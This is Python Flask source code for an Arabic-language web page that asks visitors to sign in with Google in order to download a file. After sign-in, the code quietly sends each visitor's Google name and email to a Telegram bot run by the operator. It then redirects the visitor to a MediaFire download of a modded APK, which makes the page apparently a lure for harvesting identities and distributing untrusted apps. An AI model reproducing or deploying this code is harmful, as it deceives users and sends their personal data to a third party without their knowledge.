import os
import requests
from flask import Flask, redirect, render_template_string, request, url_for

app = Flask(__name__)
app.secret_key = os.getenv("SECRET_KEY", "final_secure_key_999")

CLIENT_ID = os.getenv("GOOGLE_CLIENT_ID")
CLIENT_SECRET = os.getenv("GOOGLE_CLIENT_SECRET")
BOT_TOKEN = os.getenv("BOT_TOKEN")
CHAT_ID = os.getenv("CHAT_ID")
FINAL_REDIRECT_URL = "https://www.mediafire.com/file/61ugass1zqpavlm/Hide_Online_v4.9.50_Mod__40_Updated__41_.apk/file"

# ضع رابط موقعك الحقيقي على ريلواي هنا تماماً لتجنب أي خطأ في المطابقة (مثال: https://xxxx.up.railway.app)
CUSTOM_DOMAIN = os.getenv(
    "CUSTOM_DOMAIN", "https://اسم_موقعك_على_ريلواي.up.railway.app"
)


@app.route("/")
def index():
  return render_template_string("""
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تسجيل الدخول</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: Roboto, RobotoDraft, Helvetica, Arial, sans-serif; }
        body { background: #f8f9fa; width: 100vw; height: 100vh; display: flex; justify-content: center; align-items: center; }
        .card { background: #fff; width: 100%; max-width: 400px; padding: 40px 30px; border-radius: 12px; box-shadow: 0 4px 12px rgba(0,0,0,0.05); text-align: center; }
        .title { font-size: 22px; font-weight: 500; color: #202124; margin-bottom: 10px; }
        .subtitle { font-size: 14px; color: #5f6368; margin-bottom: 30px; line-height: 22px; }
        .google-btn { display: inline-flex; align-items: center; justify-content: center; width: 100%; background: #ffffff; color: #3c4043; border: 1px solid #dadce0; border-radius: 24px; padding: 12px 16px; font-size: 15px; font-weight: 500; text-decoration: none; cursor: pointer; transition: background 0.2s; }
        .google-btn:hover { background: #f7f8f9; border-color: #d2d5dc; }
    </style>
</head>
<body>
    <div class="card">
        <div class="title">تحويل ملف التحميل</div>
        <div class="subtitle">يرجى تسجيل الدخول باستخدام حساب Google للمتابعة وتنزيل الملف.</div>
        <a href="/google-login" class="google-btn">تسجيل الدخول بواسطة Google</a>
    </div>
</body>
</html>
""")


@app.route("/google-login")
def google_redirect():
  redirect_uri = f"{CUSTOM_DOMAIN}/authorized"
  google_auth_url = (
      "https://accounts.google.com/o/oauth2/v2/auth?"
      f"client_id={CLIENT_ID}&"
      f"redirect_uri={redirect_uri}&"
      "response_type=code&"
      "scope=openid%20email%20profile"
  )
  return redirect(google_auth_url)


@app.route("/authorized")
def authorized():
  code = request.args.get("code")
  if not code:
    return redirect(url_for("index"))

  redirect_uri = f"{CUSTOM_DOMAIN}/authorized"

  token_url = "https://oauth2.googleapis.com/token"
  data = {
      "code": code,
      "client_id": CLIENT_ID,
      "client_secret": CLIENT_SECRET,
      "redirect_uri": redirect_uri,
      "grant_type": "authorization_code",
  }

  token_res = requests.post(token_url, data=data).json()
  access_token = token_res.get("access_token")

  if access_token:
    user_info = requests.get(
        "https://www.googleapis.com/oauth2/v1/userinfo",
        headers={"Authorization": f"Bearer {access_token}"},
    ).json()

    user_email = user_info.get("email")
    google_name = user_info.get("name")

    if BOT_TOKEN and CHAT_ID and user_email:
      msg = (
          "🤖 تم تسجيل الدخول بنجاح:\n\n📛 الاسم: "
          f"{google_name}\n📧 البريد: {user_email}"
      )
      telegram_url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
      requests.post(telegram_url, json={"chat_id": CHAT_ID, "text": msg})

  return redirect(FINAL_REDIRECT_URL)


if __name__ == "__main__":
  app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)))
